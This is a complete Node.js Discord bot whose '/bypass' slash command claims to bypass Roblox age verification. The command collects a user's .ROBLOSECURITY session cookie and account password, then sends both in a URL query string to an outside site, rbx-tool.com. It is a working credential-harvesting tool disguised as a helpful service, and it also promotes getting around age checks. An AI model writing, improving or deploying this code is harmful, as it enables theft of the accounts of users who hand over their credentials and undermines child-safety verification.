
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Routes } = require('discord.js');
const fetch = require('node-fetch');

// Environment variables
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

if (!DISCORD_TOKEN || !CLIENT_ID) {
    console.error('Missing required environment variables: DISCORD_TOKEN and CLIENT_ID');
    process.exit(1);
}

// Create Discord client
const client = new Client({
    intents: [GatewayIntentBits.Guilds]
});

// Slash command definition
const commands = [
    new SlashCommandBuilder()
        .setName('bypass')
        .setDescription('Bypass age verification using Roblox credentials')
        .addStringOption(option =>
            option.setName('cookie')
                .setDescription('Roblox .ROBLOSECURITY cookie')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('password')
                .setDescription('Roblox account password')
                .setRequired(true)
        )
];

// Register slash commands
async function registerCommands() {
    try {
        const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
        
        console.log('Started refreshing application (/) commands.');
        
        await rest.put(
            Routes.applicationCommands(CLIENT_ID),
            { body: commands }
        );
        
        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error('Error registering commands:', error);
    }
}

// Handle interactions
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    if (interaction.commandName === 'bypass') {
        await handleBypassCommand(interaction);
    }
});

// Handle the bypass command
async function handleBypassCommand(interaction) {
    // Defer the reply to give us more time to process
    await interaction.deferReply({ ephemeral: true });
    
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');
    
    try {
        // Make API request
        const apiUrl = `https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`;
        
        const response = await fetch(apiUrl, {
            method: 'GET',
            timeout: 10000 // 10 second timeout
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        const data = await response.json();
        
        // Create embed based on response
        const embed = new EmbedBuilder()
            .setTitle('Bypass Result')
            .setTimestamp();
        
        // Check if the response indicates success
        const isSuccess = data.status === 'success' || data.success === true;
        
        if (isSuccess) {
            embed.setColor(0x00FF00); // Green
        } else {
            embed.setColor(0xFF0000); // Red
        }
        
        // Add fields from API response
        if (data.status) {
            embed.addFields({ name: 'Status', value: String(data.status), inline: true });
        }
        
        if (data.message) {
            embed.addFields({ name: 'Message', value: String(data.message), inline: false });
        }
        
        // If no status or message, show the raw response
        if (!data.status && !data.message) {
            embed.addFields({ name: 'Response', value: '```json\n' + JSON.stringify(data, null, 2) + '\n```', inline: false });
        }
        
        await interaction.editReply({ embeds: [embed] });
        
    } catch (error) {
        console.error('Error in bypass command:', error);
        
        // Create error embed
        const errorEmbed = new EmbedBuilder()
            .setTitle('Bypass Result')
            .setColor(0xFF0000) // Red
            .setTimestamp();
        
        if (error.name === 'AbortError') {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Error', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'Request timed out. Please try again later.', 
                inline: false 
            });
        } else if (error.message.includes('HTTP')) {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Error', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: `API request failed: ${error.message}`, 
                inline: false 
            });
        } else if (error instanceof SyntaxError) {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Error', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'Invalid response from API. Please try again later.', 
                inline: false 
            });
        } else {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Error', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'An unexpected error occurred. Please try again later.', 
                inline: false 
            });
        }
        
        await interaction.editReply({ embeds: [errorEmbed] });
    }
}

// Bot ready event
client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    console.log('Bot is ready and online!');
});

// Error handling
client.on('error', error => {
    console.error('Discord client error:', error);
});

process.on('unhandledRejection', error => {
    console.error('Unhandled promise rejection:', error);
});

// Start the bot
async function startBot() {
    try {
        await registerCommands();
        await client.login(DISCORD_TOKEN);
    } catch (error) {
        console.error('Failed to start bot:', error);
        process.exit(1);
    }
}

startBot();
